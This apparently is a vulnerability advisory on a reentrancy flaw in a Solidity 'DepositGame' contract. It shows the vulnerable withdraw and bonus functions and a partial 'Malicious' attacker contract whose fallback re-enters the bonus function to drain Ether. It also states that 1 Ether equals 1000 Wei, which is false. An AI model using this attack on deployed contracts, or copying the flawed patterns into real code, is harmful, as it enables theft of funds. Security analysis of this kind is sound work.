# Sharing-variable-reentrancy

## Vendor
DepositGame

## Vulnerability Type
Reentrancy

## Abstract
We found a vulnerability in the smart contract of `DepositGame`, which is a Ethereum deposit game. You can deposit some money to the contract and then withdraw your money. 
But you will not get the exact amount A of money that you have deposited, instead you will get a random amount of money, which is within \[0.9A, 1.1A\].
However, the withdraw function `withdarw` shares the user balance variable `_balances` with another function `GetBonusWithdraw`. 
Although the `withdarw` function itself is safe, however, attackers can modify user balances using function `GetBonusWithdraw` and then re-enter the `withdarw` function to steal money.

## Details
The `DepositGame` is an Ethereum deposit bet game. You can deposit some money and then withdraw money for the game bet.
However, you will not get the exact amount of money that you have deposited, instead you will get a random amount of money. 
This game allows a player to deposit money with `deposit()` by sending Ether to the contract.

```
    function deposit() public payable {
        _balances[msg.sender] += msg.value;
        TotalAmount += msg.value;
        FirstTimeBonus[msg.sender] = false;
    }
```

The `DepositGame` developer allows a player to withdraw all his/her money together with a 10 Wei (1 Ether = 1000 Wei) first-time play bonus for each user. 
Note that each user is designed to get the 10 Wei bonus only once. You can get the bonus withdrawn by using `GetBonusWithdraw()`, 
which calls the withdraw function `withdraw()`. The `withdraw()` function  allows a player to withdraw her reward, but together with a random game bet below 10% of her amount. 
Here, the `DepositGame` generates a random number with `random()` for the withdrawn amount bet.

```
    function withdraw() public payable {
        uint amount;
        uint randomNumber;
        uint pendingWithdrawal;
        amount = _balances[msg.sender];
        randomNumber = random() - 10;  // randomNumber is a random number between -10 and 10
        pendingWithdrawal = amount * (100 + randomNumber) / 100;
        if(pendingWithdrawal != 0){
            _balances[msg.sender] -= pendingWithdrawal;
            require(msg.sender.call.value(pendingWithdrawal)(""));
        }
        TotalAmount -= pendingWithdrawal;
    }
    
    function GetBonusWithdraw() public payable {
        if(FirstTimeBonus[msg.sender] != true){
          _balances[msg.sender] += 10;
          withdraw();
        }
        FirstTimeBonus[msg.sender] = true;
    }

    function random() public returns (uint256) {
        return uint(keccak256(block.timestamp)) % MaxNumber + 1;
    }
```

Although the `withdarw` function itself is safe, however, the function of `GetBonusWithdraw` is vulnerable. As you can see the sharing variable `_balances`, the developer intended to increase the balance `_balances[msg.sender] += 10;` before the withdrawal operation `withdraw` executed.
Therefore, it allows attackers to re-enter the contract and steal money. 

## Exploit
Below is the reentrancy attack of the `GetBonusWithdraw` function. We can utilize the sharing variable `_balances` to steal money easily.

```
contract Malicious {
  ...
  
  function attack(){
    vul.GetBonusWithdraw(_owner);
  }

  function () payable{ // fallback function
    count++;
    if(count < 10){
      vul.GetBonusWithdraw(_owner);
    }
  }
}
```

**Analysis** `_balances` is the sharing variable as it records the amount of Ether that the caller has in the contract. 
`_balances` reduce the random amount `pendingWithdrawal` before the transfer operation `require(msg.sender.call.value(pendingWithdrawal)(""));` of function `withdraw` is executed. 
This transfer operation will trigger the `fallback` function of the contract `Malicious`. However, `_balances[msg.sender]` in function `GetBonusWithdraw` is added to 10 before calling the function `withdraw`, 
thus making the contract `DepositGame` believe that the attacker still has enough Ether in the contract. 
Then, the `fallback` function of contract `Malicious` calls the function `GetBonusWithdraw` of `DepositGame`, leading to call the function `withdraw` recurrently until the count reaches 10. 
`if(count < 10){vul.GetBonusWithdraw(_owner);}`.


## Conclusion
This reentrancy attack utilizes the sharing variable `_balances` to steal Ether from the `DepositGame` contract. 
Even though `GetBonusWithdraw` does not directly execute a transfer operation, the `withdraw` is called to make it vulnerable to reentrancy.
It would like to point that this reentrancy vulnerability can bypass the detection of some automatic audit smart contract tools.  

## Reference
Ethereum Official Website

https://etherscan.io/

contract source code

https://github.com/Messi-Q/SmartConrtactGames/blob/master/DepositGame.sol



